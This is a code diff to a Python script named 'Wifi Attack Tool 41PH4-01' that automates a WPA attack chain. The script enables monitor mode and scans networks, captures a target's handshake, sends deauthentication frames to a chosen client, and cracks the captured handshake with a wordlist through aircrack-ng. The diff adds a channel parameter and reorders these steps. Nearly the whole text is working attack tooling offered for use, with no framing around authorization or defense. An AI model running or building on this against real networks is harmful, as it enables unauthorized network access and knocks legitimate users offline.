@@ -14,7 +14,6 @@
 
 import subprocess
 import sys
-import os
 
 
 # Banner
@@ -52,6 +51,7 @@ def display_splash_screen():
     print(splash)
     print("Wifi Attack Tool 41PH4-01\n")
 
+
 # Function to check if a tool is installed and install it if not
 def check_and_install_tool(tool_name, install_command):
     try:
@@ -63,33 +63,33 @@ def check_and_install_tool(tool_name, install_command):
 
 # Function to enable monitor mode on the selected interface
 def enable_monitor_mode(interface):
-    print(f"Enabling monitor mode on {interface}...")
+    print(f"Enabling monitor mode on {interface} using airmon-ng...")
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)  # Killing any interfering processes
     subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)  # Start monitor mode
     return f"{interface}mon"
 
-# Function to scan networks
+# Function to scan networks and get target details
 def scan_networks(interface):
-    print(f"Scanning networks on {interface}...")
+    print(f"Scanning networks on {interface} using airodump-ng...")
     try:
         subprocess.run(["sudo", "airodump-ng", interface], check=True)
     except subprocess.CalledProcessError as e:
         print(f"Error scanning network: {e}")
         sys.exit(1)
 
-# Function to perform deauthentication attack
-def deauth_attack(interface, target_mac, channel):
-    print(f"Performing deauth attack on {target_mac}...")
-    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, "-c", target_mac, interface], check=True)
-
 # Function to capture WPA handshake
-def capture_handshake(interface, target_mac, output_file):
-    print(f"Capturing WPA handshake on {interface}...")
-    subprocess.run(["sudo", "airodump-ng", "-c", "6", "--bssid", target_mac, "-w", output_file, interface], check=True)
+def capture_handshake(interface, target_mac, channel, output_file):
+    print(f"Capturing WPA handshake on {interface} using airodump-ng...")
+    subprocess.run(["sudo", "airodump-ng", "-c", channel, "--bssid", target_mac, "-w", output_file, interface], check=True)
+
+# Function to perform deauthentication attack on a client
+def deauth_attack(interface, target_mac, client_mac, channel):
+    print(f"Performing deauth attack on {client_mac} using aireplay-ng...")
+    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, "-c", client_mac, "-b", target_mac, interface], check=True)
 
 # Function to crack WPA handshake using aircrack-ng
 def crack_wpa_handshake(output_file, wordlist):
-    print(f"Attempting to crack WPA handshake using {wordlist}...")
+    print(f"Attempting to crack WPA handshake using aircrack-ng with wordlist: {wordlist}...")
     try:
         subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, f"{output_file}-01.cap"], check=True)
     except subprocess.CalledProcessError as e:
@@ -106,31 +106,33 @@ def main():
     # Get the network interface
     interface = input("Enter the network interface (e.g., wlan0): ")
 
-    # Enable monitor mode
+    # Enable monitor mode using airmon-ng
     monitor_interface = enable_monitor_mode(interface)
     
-    # Scan networks and let the user select a network
+    # Scan networks and display available networks with clients using airodump-ng
     scan_networks(monitor_interface)
     
-    # Input target MAC address and output file name for capturing the handshake
-    target_mac = input("Enter the MAC address of the target network: ")
+    # Input target BSSID, channel, and output file for capturing the handshake
+    target_mac = input("Enter the MAC address of the target network (BSSID): ")
+    channel = input("Enter the channel number for the target network: ")
     output_file = input("Enter the output file name for capturing the handshake: ")
 
-    # Start capturing the WPA handshake
-    capture_handshake(monitor_interface, target_mac, output_file)
+    # Capture WPA handshake using airodump-ng
+    capture_handshake(monitor_interface, target_mac, channel, output_file)
 
-    # Ask if the user wants to perform a deauth attack
-    deauth_choice = input("Do you want to perform a deauth attack? (y/n): ")
-    if deauth_choice.lower() == 'y':
-        deauth_attack(monitor_interface, target_mac, "6")
+    # Ask for the client MAC address to deauth
+    client_mac = input("Enter the MAC address of the client to deauth: ")
 
-    # Ask for wordlist to crack WPA
+    # Perform deauthentication attack using aireplay-ng
+    deauth_attack(monitor_interface, target_mac, client_mac, channel)
+
+    # Ask for the wordlist to crack the WPA handshake using aircrack-ng
     wordlist = input("Enter the path to your wordlist (e.g., /path/to/wordlist.txt): ")
 
-    # Attempt to crack the WPA handshake
+    # Attempt to crack the WPA handshake using aircrack-ng
     crack_wpa_handshake(output_file, wordlist)
 
-    # Restart the network and cleanup
+    # Restart the network and cleanup using airmon-ng and networking service
     print("Cleaning up and restarting the network...")
     subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface], check=True)
     subprocess.run(["sudo", "service", "networking", "restart"], check=True)
